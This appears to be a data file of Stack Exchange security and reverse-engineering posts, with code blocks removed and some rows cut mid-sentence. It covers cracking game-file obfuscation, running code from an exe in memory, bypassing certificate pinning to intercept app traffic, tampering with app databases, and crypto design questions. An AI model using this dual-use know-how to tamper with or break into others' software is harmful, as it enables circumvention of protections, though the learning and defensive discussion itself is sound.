","These files are definitely not compressed. behavior_trees.dat is a binary file which is not encrypted and not compressed, just binary. Encryption, as far as I can see, looks like substitution cipher which should be relatively easy to crack with frequency analysis if you know what should be there. Assuming that decrypted content of files from older and newer versions are similar you can try to account frequencies of symbols on a base of files of previous versions. Here is what I'd do for decrypting (for example) assembly.dat file: Get a corresponding file from previous version which should be not encrypted. Account frequency of appearance of each symbol (should be easily done with simple python script) Account frequency of appearance of each symbol in newer version files. Try to replace symbols from the newer files to the symbols with same (or alike) appearance rate from the older file and see what happends. UPDATE, Just for the sake of completeness: I used an excellent tool  by Didier Stevens (it was mentioned by @Andy Dove in answer to another question, which reminded me to return to this one) and found out the following: Assuming that the decrypted content of current file is similar to content of previous I tried to find some words from the picture you provided with this tool (for example words like item, Pickup and Physical) . The tool shows that it is xor substitution cipher, the key is 0x2a, applying it to word filter  and lang int files gives reasonable result. Applying this key gives a lot of reasonable strings, for all files I tried the key was the same. According to your claim you know some basics in programming. Which means that you'll be able to run the following python script on your files and understand what happens or translate it to the language of your choice. Good luck. {code-blk}",94,425,1,True

","What does ""(not) emulating hardware other than the CPU"" mean? This means that whenever the software being emulated accesses hardware, it won't work in Unicorn in the same way as on actual hardware. We have several questions about emulating firmware on QEMU. The general answer is that, when you try booting a firmware kernel in QEMU, that kernel will access some I/O ports, but in the emulated environment, those I/O ports won't react in the way they should. For example, an input bit that signals ""device ready"" will be stuck in one state, instead of toggling between true and false. To make your software work as intended, you need to emulate this hardware as well - for example, your emulator needs to know something like: Bit 3 of the input port at {code-blk}"".

Here is a video that goes into great detail of doing the latter far more than anyone will here  Note from the video To summarize you'll need a logic analyzer, potentially a way of getting the device to tell you it is about to send a packet in some manner (otherwise you will have better luck with a USB analyzer or in kernel USB monitor). Sigrok is software used there... but there are others. Here is a little python code the guy in the video uses which will probably be of use to you. Which is just a basic example of using pyusb he was using it to talk to whatever micro controller board he was debugging you could use it to talk to your FPGA perhaps as you figure out what it's protocol is doing. {code-blk} The method you choose largely depends on what you need to know, if the device is functioning properly and you don't need to make changes to it, perhaps a software monitor is good enough. If it is indeed USB serial is it a dedicated chip? If so find it's datasheet... and investigate the circuit that may tell you some things. Common USB to serial chips are the the following which either use a standard USB CDC ACM protocol (check if chip in question is this then you can just grap the spec for it here ) or custom driver. Note that the USB end of the protocol itself is probably baud rate independent but you may need to tell the USB serial convert what rate to run at... it depends alot on how it was designed. Probing the Uart output pints of the controller would allow you to figure out the correct baud rate if you can't figure it out from the circuit itself. Another way to go about this would be to figure out at least one command that will give you a response... then exhaustively try different baud rates and configurations until you get the expected response.

If the file has no associated entry point, this member holds zero. Source: And a more detailed description from : In computer programming, an entry point is where control is transferred from the operating system to a computer program, at which place the processor enters a program or a code fragment and execution begins. In some operating systems or programming languages, the initial entry is not part of the program but of the runtime library, in which case the runtime library initializes the program and then the runtime library enters the program. In other cases, the program may call the runtime library before doing anything when it is entered for the first time, and, after the runtime library returns, the actual code of the program begins to execute.

","COM is very abstract idea in Object Oriented Programming (OOP). To understand this well, you need some in-depth knowledge of , ,  and . Those subroutines are part of a COM Proxy/Stub DLL. Proxy DLL are used when the COM interfaces are defined/implemented in separate DLL files. Think these as a simple function call but with COM virtual tables. In case of dynamic linking, DLL has exported functions and EXE files call them. In case of proxy/stub COM, the underlying functions are defined in a separate DLL files. When an executable call any method the parameters are marshalled (i.e. packed/assembled) through Proxy DLL to the main DLL where all the real things happens. Proxy DLLs contain just the list of those methods, aka. Virtual Functions in Virtual Method Table (vtable or vtbl). So, the ""ObjectStublessClient"" are the virtual functions only. In simple C language, this can be compared as function pointers in a structure (with oversimplification). In IDA, go to View --> Open subviews --> Names or press Shift + F4 to open 'Names Window'. Search for 'ProxyVtbl', you can find defined virtual tables. Here is an example of  in Ole32.DLL file. In IDA assembly view: {code-blk} because Windows binary generally use that calling conventions.

","As explained  for a similar problem, facing an unknown Frame Check Sequence, the first thing should be to determine if it is an affine function of the frame data, for the sense that has in cryptography. This can be defined by the property: For any set with an odd number of frames of equal length, the XOR of the Frame Check Sequences for these frames is also the FCS for the (often, other) frame obtained by XOR-ing the data portion of the frames in the set. All CRCs are affine (including non-standard variations); secure cryptographic hashes and Message Authentication Codes are not. There is evidence that indeed that FCS is affine: it is easy to isolate blocks of four (or larger even number) of different lines such that one is the XOR of the others, and that allows prediction of the last two bytes for most lines. Two examples: {code-blk}. One possibility is that this FCS is one of countless failed attempts to implement CRC-16-CCITT; though one that went unusually out of track, in a way that still puzzles me. I'm tempted to incriminate a partial or misaligned capture, but that tends to conflicts with the statement: When I 'replay' the collected messages the lamp reacts as expected. More samples might help. Perhaps, put this into a  linked in the question or a comment. Perhaps, give settings of the  device and/or software used for the capture.",472,339,1,True

","I managed to solve it and I will write it here so that it hopefully can help someone more facing the same issue.

If I moved the database outside of the /data/ and then pasted it back into it's original location the app would crash instantly on start up, and I still don't know why (I didn't change anything in the file itself and i restored the original file permissions and ownerships since they had automatically(?) been altered during the move) but the app would still crash. The solution (and I don't really know why it works) would be to use the dd command to make a copy of the database, use adb to pull that copy to my PC, edit it with DB Browser for SQLite and then push that manipulated copy back into /data/data//database and lastly use dd to copy the content of the manipulated database into the original database.

","The protocol spec clearly does not apply to your device, so don't bother trying to use its checksum calculation. However it may be similar enough to provide some clues to the actual protocol. The protocol should include some method of synchronizing the serial data stream. In the (incorrect) spec this could be done using the high nibbles (8,9,A,B) that all have bit 7 set. In your data only bytes A7 and B7 have bit 7 set, which suggests that this bit is used for synchronization. Bytes A4-A6 and B4-B6 appear to be digit and flag data. Bytes A2 and B2 match the fixed value for {code-blk} The first 11 lines in your data dump all have unique 'checksums'. Looking good so far! The next 9 lines are not so good, as they have many duplicate values. However I have not attempted to calculate checksums of address and data bytes. Depending on the algorithm used, some lines may be expected to produce the same checksum. For a thorough analysis I would capture more data with as many different digit and flag combinations as possible, then write a program to create checksums with various algorithms until one matches the bits in A7 and B7.",234,281,1,True

Is it possible to protect it such that no one will be able to crack it? No, and it's important to know that and keep in mind that what you really want to do is to keep it as hard to crack as possible and dishearten potential violator from doing that. So, you want to make it so complex and obfuscated that it would require a lot of work to change anything both statically and during the runtime.

","This is an interesting problem where some issues have to be solved. For the first part of your question: How to run an exe from memory, you might want to consult the following link: In the following, I will try to show you how to tackle your second question, how to call a class method of that exe being present in memory. The following example (keep it as simple as possible) does not assume a DLL as a caller, but another exe. The mechanics should be exactly the same, however. Part 1 : Called exe Let us start with a very simple C++ Windows (VS2013) exe serving as the one to be called from another exe (or DLL in your case). I named this exe ""ExeToBeCalled"". {code-blk} It has to be noted that our test exe from part 1 has to be compiled in Debug instead of Release mode. It is too simple for the compiler which optimizes it and does not even bother to call the myFunc, but directly calculates the result. To summarize, for the solution of your problem the following must be assumed or known: The address of the class method. We assumed a static address which need not to be the case in general. ""Static Address"" here means a constant offset (RVA) of the exe's start address obtained by LoadLibrary, which usually differs on every load (ASLR). The way the compiler of the exe used to call a method of a class. Here we assumed the passing of the ""this"" pointer in the ecx register. The memory location where the result of the method call is stored. This also can be arbitrarily complicated in general, in our demo the simplest possible memory layout turned out to be correct. In one of the comments the question about 64Bit has been asked. Of course, there the situation might be different, the method to investigate the problem would be rather similar. I hope this little example could enlighten one method how to attack your problem.",167,450,1,True

Does decompilation not really work if you are starting from hand-written assembly? It may or may not.

","My personal Apache server occasionally gets some pretty obvious scans for vulnerabilities.  The client that does the scanning does GET HTTP/1.1 methods on a variety of URLs, and uses a variety of User-Agent fields.  The scanner seems to always use the following HTTP headers in every request (not necessarily in this order): {code-blk} I've tried some of the open source web client libraries (Perl's libwww-perl, PHP's curl library, Python, wget, pmapwn, maybe a few others) but by default, nothing I've tried generates HTTP requests with that combination of Accept, Accept-Language and Accept-Encoding header values. Based on Nmap operating system identification shortly after scans, and p0f passive identification, the client or scanner most probably runs on Linux. What HTTP client or vulnerability scanner generates GET requests with those header values?  Can anyone point me to the source code for it? EDIT I'll give more info.

My algorithm: {code-blk} value for how many times it must be hashed, which is not stored along with the hash. In this way, you must hash the password a number of times until you find something that meets the required difficulty level. This is easy to verify, but does require time because it's unknown exactly how many times the value must be hashed. There are some interesting properties of this mechanism: An incorrect password is slightly undetectable. The only way to know it's incorrect is if you know the difficulty level and you find a hash which meets it, but doesn't match the hash It's probably quite hard to compute any of this in parallel? In theory, it's completely unknown how long it will take to verify or compute a hash (other than probabilities) Bruteforce would probably be hard because each password attempted may result in extremely large amounts of hashes needed to verify it to the difficulty However, I can't really come up with a good use for these properties. Is there any good things to apply such a scheme to or is there anything that uses such a scheme? Also, are there any potential weaknesses to this hashing scheme? For my testing, I used SHA256 as the hashing algorithm, and it got quite slow after a difficulty of about 20 bits of zeros. However, this could easily be replaced with using scrypt, bcrypt, or SHA512 Also, one more idea is that you could possibly construct ""quick"" to verify hashes, but only when given the correct password. (by changing the salt if, say, you've already hashed the value X times and you want to target only hashing the value Y times to verify it when given a correct password)",109,478,1,True

On the official Tor homepage they claim: Tor does not protect all of your computer's Internet traffic when you run it. Tor only protects your applications that are properly configured to send their Internet traffic through Tor. To avoid problems with Tor configuration, we strongly recommend you use the Tor Browser Bundle. It is pre-configured to protect your privacy and anonymity on the web as long as you're browsing with the Tor Browser itself. Almost any other web browser configuration is likely to be unsafe to use with Tor. The Tor Browser will block browser plugins such as Flash, RealPlayer, Quicktime, and others: they can be manipulated into revealing your IP address. Similarly, we do not recommend installing additional addons or plugins into the Tor Browser, as these may bypass Tor or otherwise harm your anonymity and privacy. Is this something of concern for me when I run the script below (with Vidalia/Tor enabled)? Would my real IP be revealed if I ran the script on different webpages? The webpage in the code below (my-ip.heroku.com) is very simple and only returns my IP address.

","Hello information security stack exchange! I made a captcha application in PHP. It's certainly not a great idea to do so, but I was bored and I wanted to learn about Bézier curves and Bresenham line algorithms. Therefore let's disregard that my application is not really secure against serious cracking attempts that try to crack it with OCR methods. To my question: My app basically writes every two hours 10 new captcha images in a directory (with a cronjob). If there are more than 1000 images in the directory, it replaces the oldest 10 images with the newly generated ones. So there is always a pool of 1000 captchas that slowly but steadily refreshes. All the captcha images have a 18 char long random filename and I have a associative array in my database that maps the filenames as keys to the captchas value.The array looks something like this: {code-blk} Whenever my captcha application hooks into a comment form or login form in order to inject a captcha image, it choses a random captcha from the pool and let's the user try to solve it. Now you might already see the security drawback: How can I make sure that a user doesn't download all captchas and maps them manually (Decipher the captcha manually and map it to the md5-sum of the png-image) to it's corresponding string value and then spams my site with a script? The attacker would just need to download around 20 percent of all images and then he had a average success rate of, errhh, yeah 20%, in succeeding to spam my site (The script would just refresh the form as long as it serves a captcha that it knows). How would you defend against such attacks? (Under the condition that my app architecture doesn't change: I can't generate captchas on demand, it would be too slow).

My current security measures are iptables rules that prevent 2nd-wifi-user access to my original network based on source IPs or source interfaces. My fear is that these may not be sufficient. {code-blk} I don't know much about spoofing but it seems to me that if a 2nd-wifi-user ""doctored"" his requests to the router configuration page (that sits within $HOME_SUBNET) as being from a source IP within $HOME_SUBNET, he could access and interact with the configuration page since he'd be able to sniff all of the traffic to the fake source IP address and construct sensible responses. Right? If I'm wrong, and my iptables rules are in fact sufficient, could someone please explain why a spoof is not possible given my rules and reasoning. Otherwise, does the encryption on my home wifi play a role in this? For instance, if my home wifi was WEP/WPA2/802.1x-encrypted, then would the response to the fake $HOME_SUBNET source IP be encrypted as well and thus be unreadable to my guests (thereby effectively securing my home network from my guests)? This seems sensible... Thanks! PS: this question follows from a recent  of mine and the responses I received for it.

","I have an c/c++ program used for encrypting data for communicating between two ends. Encryption is done using OpenSSL (0.9.8d-fips, Sep 2006). Think it'll be worthy to mention that I'm not much familiar with using OpenSSL. The program works fine for larger packets. But the size overhead is very high when encrypting smaller size packets. I've done a test to demonstrate the issue. {code-blk} The test was done while incrementing the number of input characters from 1 to 10000 . Following graphs illustrate the results more clearly. Graph 1: Encrypted size vs Input Size Graph 2: Ratio vs Input size From the second graph, it's clearly visible that the encryption overhead is very high for smaller inputs (size less than 300bytes). Is this normal/acceptable? If it is so are there any alternatives (with less overhead). Because the application uses smaller packets heavily (Bundling them together is not an option). As mentioned above, OpenSSL 0.9.8d is used, which is a bit older version (1.0.1g, April 2014, is available now). Will the problem be fixed if I upgrade it?",267,281,1,True

The system locks out the user from the system, generates a 40 characters random alphanumeric string as a authtoken, and stores this hashed in the database with SHA1, together with the encrypted username, the time is was created and the hash of the old password. If the user have any previous authentication tokens in the db, it deletes them. The system sends a link to the email connected to the user having it's password triggered for resetting. The user clicks the link, which is over https, and the system reads the authtoken. The system hashes it again with SHA1, searches the database for it: The authtoken does not match: Error page. {code-blk} class, which is discouraged due to less than optimal randomness, would this really be a problem considering that only an an authorized and authenticated administrator can trigger the reset?",145,288,1,True

This one does not. The question, then: does being able to redefine commands through the environment count as a vulnerability? Is there any common situation in which it could be exploited for nefarious purposes? (For example, Git/Mercurial over SSH, Gitolite...)",60,221,2,True

","I need to encrypt some data and have it decrypted on a later point in time. The data is tied to specific users. I've gathered two possible solutions... 1: The first one is derived from the official docs (example #1 @ ): {code-blk} I'm aware that both approaches to the key handling is interchangeable, I purposely made them different in that respect in order to highlight possible solutions, please feel free to mix and match. Personally I feel that the first one offers tighter security since both key and initialization vector is properly randomized. The second solution however, does offer some form of non-predictability since the key is unique for each piece of encrypted data (even though it suffers under the weak randomization of md5()). The key could for example be the user's name. 3: So, which one is preferable? I'm slightly in the dark since the Stackoverflow answer got a whopping 105 votes. Other thoughts, tips? 4: Bonus question!: I'm not incredibly brainy on server security aspects, but obviously gaining access to the PHP files would expose the key, which as a direct result, would render the encryption useless, assuming the attacker also has access to the DB.

However I want to use a well-known standard such as . While coding an AWS-compliant client and server HMAC auth implementation, I noticed some uncommon aspects of the standard's design. I fail to fully grasp several design choices that were made. Question 1: Why does AWS use a complex signing key (produced via HMAC) instead of the shared secret itself? describes: Before you calculate a signature, you derive a signing key from your AWS secret access key. (You don't just use your secret access key to sign the request.) You then use the signing key and the string to sign that you created in Task 2: Create a String to Sign for Signature Version 4 as the inputs to a keyed hash function. The hex-encoded result from the keyed hash function is the signature. To calculate a signature Derive your signing key. To do this, you use your secret access key to create a series of hash-based message authentication codes (HMACs) as shown by the following pseudocode, where HMAC(key, data) represents an HMAC-SHA256 function that returns output in binary format. The result of each hash function becomes input for the next one. Pseudocode for deriving a signing key: {code-blk} The date must be in the YYYYMMDD format.

","I'm looking at  and am left a bit confused about why you would use . The document even talks about using : Algorithms of matching strengths should be used together whenever possible.  For instance, when AES Key Wrap is used with a given key size, using the same key size is recommended when AES GCM is also used.  If the key encryption and content encryption algorithms are different, the effective security is determined by the weaker of the two algorithms. Essentially I'm wondering why you would use AES key wrap at all. Example So for an example comparison, using the A256GCM encryption algorithm I need a 256-bit key. Just to be easy my key will be ""secret0123456789secret0123456789"" and I'm encoding ""Test"".

Direct JWE results in a smaller payload to be sent over-the-wire, and I would presume it's slightly faster to both encrypt and decrypt because it's skipping a step. Does using AES key wrap yield higher security, and if so, why? If not, why would you use it instead of just direct content encryption?",234,374,1,True

The JavaScript is never directly talking to S, however. The web server A1 has some means to forward messages to S, e.g. a simple PHP script. There is probably no way to block evil users from contacting S through A1 in the same way as the JavaScript does.

So basically the big flaw of old hashing functions were rainbow tables, something that the currently modern algorithm used by PHP in their password hashing API, blowfish, deals with. Of course it is pretty complex and undoubtedly it's built by people way smarter than me, but still I just couldn't help but wonder, if I built my own hashing function that wasn't vulnerable to rainbow tables and didn't store the salt in obvious places such as extra columns in the database or use user information like name or email as salt, would that be any good?

","Edit: Let's assume Windows 7 and potentially Windows Server 2003/2008. IMHO, any machine that has malware should be reimaged/reformatted/OS reinstalled before it is deployed back into the environment. However, this isn't always practical.

So, my question assumes that management insists that a machine is remediated and has accepted the risk of doing so. Also, assume that all root cause analysis on the infection has already been completed. I would like to build a checklist of things to look at with the goal of reversing any changes malware has made to a system. Edit: Due to the broad nature of this, perhaps those that are familiar with malware analysis can comment on the most common things they see malware change on a system that are related to maintaining persistence even if the malware is disabled/removed. (e.g., create an account or other backdoor that allows remote access to a system). Obviously, there are entire books and courses on this subject. This is not meant to be comprehensive. Rather, it is a checklist of common things to check/fix for a situation where reinstalling the OS is not an option and it is believed the malware has already been removed.

","We have two hosts, theoretically in the same data center. The two machines are hosted at Online.net. We're having a bit of a debate: should the traffic between the two hosts be encrypted. The traffic we need to exchange are Redis queries. The data that will be exchange is Twitter and Facebook user IDs, a code to indicate a job to do, and a market ID, which is itself a UUID. A typical query and response would be: {code-blk} The two implementations we're thinking of: Use an SSH tunnel with port forwarding to hide the Redis server from the public Internet. On the machine hosting the Redis server, create a separate user with a single aurthorized_keys, with proper securities to not allow running arbitrary programs; Simply use the firewall to limit traffic to Redis to the single IP address we need, nothing more. We're not sure which would be ""more secure"" (or more appropriately, less risky). Adding users and configuring SSH introduces complexity, while adding a firewall rule is much simpler.

This can be done with the following pattern: {code-blk} At the end of this exchange, User A and User B both have bearer tokens that they can use in subsequence requests to prove their ownership of their respective URLs (proof being that they received the tokens at all).

","I know, the general advice is ""keep your hands off crypto stuff"". And the standard way to encrypt backup data securely would be using GnuPG. However, for a rather academic exercise, I would like to think through a protocol that would work just with OpenSSL's standard tools (i. e. dgst, enc, rsautl & Co) invoked from a POSIX shell. The scenario includes a more or less trusted system on and from which backups are created - this could e. g. be a mail or file server. Then there's a storage which is not 100% to be trusted (e. g. a cloud storage, or a backup server not entirely under my control). So the purpose of the crypto is to protect confidentiality and integrity of the data while stored on the untrusted storage. This protection should also work in case the trusted system gets compromised - at least for data stored before the trusted system was compromised. So here's a kind of protocol that should fulfill the aforementioned criteria: Step 1: RSA Key Pair This step only needs to be performed once. An RSA key pair is needed. This key pair shall not be created on the ""trusted"" system, but instead on a really trusted box (e. g. a trusted work station or wherever you'd trust to keep your GPG key ring). Since the private key is only needed for recovery, it shall never enter the realms of either the trusted system or the untrusted storage. Key size needs to be 4096 bits or above (we come to that later). OpenSSL usually offers key generation and separation by those commands: EDIT: switched to PKCS#8 for the keys, being probably more resistant to brute force attacks {code-blk}, given that this would require the private key to reside on the more or less trusted system?",54,423,1,True

Nmap done: 1 IP address (1 host up) scanned in 16.55 seconds
","Recently I upgraded my home router into . It is a cheap one, but it has features I needed: IPv6 support and Gigabit Ethernet. So I decided to give IPv6 a try. I configured a Hurricane Electric tunnel, so every PC on my home LAN got a public IPv6 address. I configured IPv4 firewall and NAT quite easily through web interface, but the router has very simple IPv6 firewall - it blocks anything incoming. So I disabled it and configred Windows Firewall on each individual PC. Recently I tried to check the security of my network, so I did a Nmap scan of each host. Everything was OK until I got this output for my router: {code-blk} port, will I be safe enough? Update 2 Actually disabling the service didn't work as expected: it just stopped giving the routers IP as a DNS server through DHCP, so I configured the router to give my ISP DNS servers. It is still listening on the public IPv6 address. However, I managed to disable telnet entirely on both IPv4 LAN and IPv6 address.",126,252,2,True

","I have a scenario where user entered passwords need to be stored for later use. I cannot use hashing because I need to get the original password for later use. For example, consider an email sender app where a user would initially enter a password for his email account and the application would store it in encrypted form and when the application needs to send an email it would decrypt the password and use it to send the mail. Now, here is what I am doing: The application stores a master key (generated using RNGCryptoServiceProvider) in the database Both the Key and IV for AES are derived from the master key using Rfc2898DeriveBytes (password=masterkey and salt=user_id for Rfc2898DeriveBytes) {code-blk} Am I doing this the right way? Are there any corrections to be made? Also, are the sizes being used (for key size, masterkeysize, etc.) good enough? Few more questions(just for the sake of knowing more): Is deriving keys(seperate AES key for each user) from a high entropy master key considered not worthy(or worse)? (i.e using just the master key as AES key is more than enough). If so, why?, my argument is - should someone deduce the AES key for a particular user, he/she will still not be able to deduce the master key, so other users are safe. I came across - 'Key Diversification' which is used in some smart card apps where they derive a seperate AES key from a master key for each instance(does the same not apply here?) Can we just use PBKDF to derive keys in this scenario, or should we use a KBKDF? if so, could you mention a library(preferably from .NET framework) that offers KBKDF? I know that RfcDerivativeBytes uses a PBKDF to derive a key, but i couldnt find out how to derive a key using KBKDF.",237,489,1,True

","I know that email is inherently insecure anyway, but considering that pretty much everyone that I send email to is using a large, somewhat-trusted cloud provider, (hint, starts with G) I would expect that most of my email is sent through relatively secure MTAs that either require or prefer to use TLS. From that assumption, I would draw the conclusion that if I wanted to host my own email server and if I cared about security, then it MUST support TLS and have a certificate signed by a trusted authority. Ok, that's all fine, I can set that up myself. But what if I want to self-host this server? I know I can easily pay a cloud provider to host it for me, but I have an irrational desire to escape the cloud altogether and build my own infrastructure. However, that opens up a host (no pun intended) of other problems. Email delivery from residential IPs is spotty at best. Internet access and electricity don't have 100% uptime in residential areas. Maybe I mess up my server and have to redeploy it. Or maybe I have to take it down to upgrade it. So, maybe I want to rent a VM from a cloud provider and run an SMTP server, but at the same time I don't want my private key to leave my own machine. I am a very capable programmer, so I'm considering actually attempting this. I'm just unsure if it is physically possible given the TLS protocol.

The IP address followed by port 80 just appeared out of thin air. Upon investigation *.com.com resolves to this IP, which seems to be a host for malware. On the other hand, it seems at least conceivable that some kind of script or automated process (maybe Webmin?) incorrectly resolved a hostname with an extra "".com"" on the end and, for some bizarre reason, shoved it into ports.conf. Also, had this been maliciously inserted by an intruder, I have no idea what it would accomplish. The only other program that should have messed with Apache's configuration was roundcube webmail, from an official repo. There is no one else with access to this server. The auth log shows a number of unsuccessful SSH log in attempts from various IPs, in the several hours that the server's been up, but no successful log ins other than my own.

","Summary: A TLS client appears to be failing to negotiate when the server hands over a 127-byte pubkey in the DHE_RSA Server Key Exchange message, but succeeding when it hands over a 128-byte pubkey.  What's the deal with pubkey length, and specifically, is this legitimate behavior on the server's part? Gory details: I have a client (software unknown) that's experiencing intermittent failures connecting to my TLS server (F5, TLS 1.2).  Successful and failed connections all settle upon Cipher Suite TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 (0x009f) in the Server Hello.  All connection attempts reach Server Hello Done and failed connections are FINned by the client immediately following that. Looking at packet captures, the failures all seem to coincide with a ""Pubkey Length"" of 127 in the Server Key Exchange handshake: On the other hand, every successful negotiation with this client has involved a ""Pubkey Length"" of 128 in the Server Key Exchange handshake: Whenever the server sends the 127-byte version, the client responds with a FIN/ACK instead of the Client Key Exchange.  The conclusion we've come to is that the 127-byte pubkey length is not acceptable to the client.  I've read   to see if I can get an idea for what's allowed and they're not helpful (to me, at least!): {code-blk} So is it 1024 or 1016 bit?  Does the 'p' length indicate key strength instead of the Pubkey Length (ssl.handshake.ys_len for those following along in Wireshark)?  Where is ""Server Key Exchange"" for Diffie-Hellman defined?  Someone found enough documentation to write a Wireshark parser, if I could look at the doco they used maybe I'd better understand the expectations around these fields.",478,455,4,True

How would you fix them? How would you store your passwords? If you store them that way, by what mechanism do you recover the password to validate it against what the user typed into the password form? Here is what I see so far: XSS: The fact that user input (user) is pushed into the responding jsp page without going through an encoding library or validator means you are owned. Fix: I would implement the sanitizer from the OWASP java encoder project into the HTML element. I would store the passwords as a salted hash using bcrypt.

","Context I am trying to learn more about web security through looking into how various iOS native apps work under the hood. I have been using Burp Suite as the MITM tool to sniff out the network traffic sent and received from the apps, and on the iPhone I have SSL Kill Switch 2 installed to bypass any certificate pinning. It's very interesting and amazing to see how everything works under the hood, for a beginner like myself. I had no trouble at all with most of the apps, this includes some apps that are supposed to have high security, such as several mobile banking apps - as soon as the SSL is lifted, everything is visible in plain text. Interestingly, some mobile games are giving me a hard time. Challenge The intercepted traffic appears to be encrypted JSON files. For example, {code-blk} seems to be the check-bits based on the timestamp. Because performing two identical actions in game results in two almost identical JSONs, except for the timestamp and this particular section in the payload. The payload's encryption has got something to do with Base64 or AES, because of the signature trailing =('s), and different payloads' lengths are always multiples of 4. I am not sure if the latter means anything. The encryption key used seems to be constant. It does not change from different sessions and on different devices. Question Am I right in my analysis so far? Where should I go from here? With my almost-null knowledge in these fields, I am not sure what's the next step to take. I am think I might need to decompile the app and look into the binaries to try to see if I can find the decryption key/function lying around. But I am not sure. I am aware that there will be a lot of learning ahead, but I don't mind it since I am enjoying it very much and I would appreciate greatly some help, even if it's just a quick list of the topics and URLs I should look into. Update 2015/11/23 I dumped out the decrypted binaries of the app and ran a strings command on them, then I made a Python script to successfully pick out the encryption key.

","So I was put on an engagement over the last week and I found a potential XSS when using Burp's intruder/repeater. However, the strange thing that I noticed was that the response in Burp is different to when I request it in the browser (Firefox & Chrome - both with the security measures, such as XSS Protection, turned off). I also tried to ""Request in Browser"" through Burp, but to no avail. At first I assumed it was a different UA, so I made sure that they were both the same (even tried removing it from Burp), and eventually I did this with all of the HTTP headers just to make sure there was no difference there. With Burp I get the page back with a successful XSS payload in the source, in the browser I get a 404. Obviously as this is a work engagement I cannot provide specific details of the host/target. My question is, why would burp give me a 200 response with the source code and the browser throw a 404 error? {code-blk} Thanks",123,246,1,True

One other hit on the net with 22 upvotes says ""This is plug and play code that I found on internet. It just works:"" This cause me some headache. Is this secure? I can't see why authors bother to create an IV functionality just to see it being shortcut just by cutting key in half to produce a byte array with size that fit IV? I feel that the question will be more complex because if the different cipher modes use the IV on different way. Also it may be dependent on how the application is built. For instance; is the full key always unique? If not, how is the entropy of the key? And separately, is the pair (iv, password) always unique?

","I've spotted some differences in the behavior of the GNU/Linux dynamic memory allocator in i386 vs amd64. While it's possible that I'm misunderstanding something ( in this case let me know ), I don't understand why these differences are present and before digging inside the code I want to know if anybody has already investigated this. Let's take this program ( test.c ) as example: {code-blk} After the malloc in (1) we have in both cases that the space is taken directly from the top chunk, and this is as expected: However after the free in (2) the first difference can be noted: As you can see from the screenshot in the ELF-64 bits the chunk that has been freed is not updated with the new size, but the size is still 0x71 and the first QWORD is nullified. In the ELF-32 bits, as I expected, the freed chunk is instead merged with the Top Chunk and the size is updated to 0x20f99 + 0x68 = 0x21001. Later when the second malloc in (3) is executed, in the x64 case the new chunk is allocated right after the previously chunk by shrinking the top chunk, while in the i386 case the previously freed chunk is reused. These are only two of the differences that I have noticed, and I think that there are many others... So, is there somewhere a document/research/white-paper that describes these differences?

Patching the XMLHttpRequest property would prevent this, and taking into consideration that all other mesures were taken to prevent XSS (sanitization), this would close the final gap and let you take control of network requests, preventing malicious code from stealing the auth tokens.

","I stumbled upon . I have the same problem as the OP, and am sorry to report that the proposed answer does not resolve it. Certificate in question has been verified by OpenSSL-1.0.2h: {code-blk} Yet the current stable Firefox (47.0) is giving me that same message, and refuses to use that certificate for establishing a TLS session (doesn't even offer it among the available certs). It shows this certificate (among others) in Prefs->Advanced->View Certificates. Needless to say, CA that issued this certificate, was imported to ""Authorities"" and marked as trusted for all the three options. The only possible thing that I could think of - this CA does not offer CRL or OCSP, so neither it not the certs it issues have pointers to CRL or OCSP. One suggestion I got was: Welcome on Security SE. Do not hesitate to post your question as a new question referencing this one. Details of both the CA and end-user certificates can be helpful. However, before doing so you should try to add the ""Key encipherment"" key usage to the certificate as a first step. In case it does not help, try to add ""Data encipherment"" and remove ""Non repudiation"" (or disable the ""Critical"" flag on these extensions). The problem with the above is that we have fairly strict rules on the Key Usage attributes, particularly on certificates that that are provisioned to hardware tokens. So it is not possible for us to, e.g., remove ""Non-repudiation"" from a Digital Signature cert, or add ""Key Encipherment"" to it.

RRset of DNSKey records for the root zone (the root zone's PubKSK and PubZSK)
RRSig of the above DNSKey RRSet signed with the root zone's PvtKSK

DS record for the com zone (hash of the com zone's PubKSK)
RRSig of the above DS record (signed using the root zone's PvtZSK)

The RRSig containing Root zone's DNSkey record is decrypted using the Root zone PubKSK (already held) 
The hash of the Root PubKSK from the RRSig is compared to a hash of the Root PubKSK already held by the recursive server, to verify the authenticity of the key.

If the hashes match the key is trusted and therefore the Root PubZSK is also trusted and can be used to decrypt the RRSig of the DS record for the com zone

Once decrypted the hash of the come zone's PubKSK is compared to that in the DS record to verify that the com PubKSK can be trusted.

Host A queries it's recursive resolver for info on the web server www.isc.org 

The recursive server's requests on behalf of Host A will be answered by the name-servers responsible for isc.org and contain the records required by DNSSEC. 
","Let me apologize in advance for this question has been answered. I did have a good look and if it is here somewhere I missed it. My question hopes to clarify exactly what happens when a validating resolver queries a DNSSEC aware nameserver for a RR. I thought I understood the process, then I read an explanation written by someone I would think can speak authoritatively (no pun intended) on the subject. I think the easiest way for me to do this is to explain what I thought the process looked like and then the contrasting version. And hopefully, someone among you all will be able to clarify where I might be going wrong. Example A (or how I thought a DNSSEC query worked): Host A sends a query to it's  recursive caching DNS server for www.example.com The recursive server sends an iterative query to a DNS server that is authoritative for the root zone The root DNS server can't answer the query directly so it responds with: {code-blk} Validation now begins when the recursive resolver asks the isc.org name-server for the keys for it's zone. Once those keys are provided then the recursive server then queries up (the parent) to validate responses in reverse fashion to Example A, until a trusted key (presumably or typically from the root) confirms that the chain can be trusted. The question: Can I trouble someone with a better understanding to confirm that my understanding (as explained in Example A) is incorrect? I don't doubt Josh Reed but the second example seems to be less efficient.",331,361,1,True

","In a normal setup (cert), you have a strong encryption - just like here - for example, AES256. But you also use dh and the tls params. Just to be absolutely secure. Now, if you use the static key setup (), which is a simple 2048-bit key file shared between the server and client that you transfer yourself through a previously established secure channel... then you are not able to use dh and tls. How safe is to have the server running 24-7 on a custom port, using this static key setup? Copied from the sample {code-blk} dh provides . This is what you will miss without the normal certificate based setup. By the way: Let's imply the server is DDoS protected to an extent. OVH and both Hetzner, and even VPS providers now offer DDoS protection so it's pretty much a standard. Let's imply the user has a firewall, and only SSH and OpenVPN is allowed. Update #1: Let me summarize things. Static Key is just one file that you copy to your server, and to your OpenVPN folder. It will allow you to have a very simple setup with proper encryption even. (AES, and so on). This setup, however, lacks forward secrecy. This is stated on the official OpenVPN website. Not only that, it will also disallow you to use the ""HMAC firewall"". Losing forward secrecy is a clear drawback(*). That is half of the answer. But what about the HMAC Firewall? Does it make your server vulnerable? Your OpenVPN easier to get breached? (*) - Of course for someone to decipher the data, that specific someone needs to log every bit of data. Then, he has to 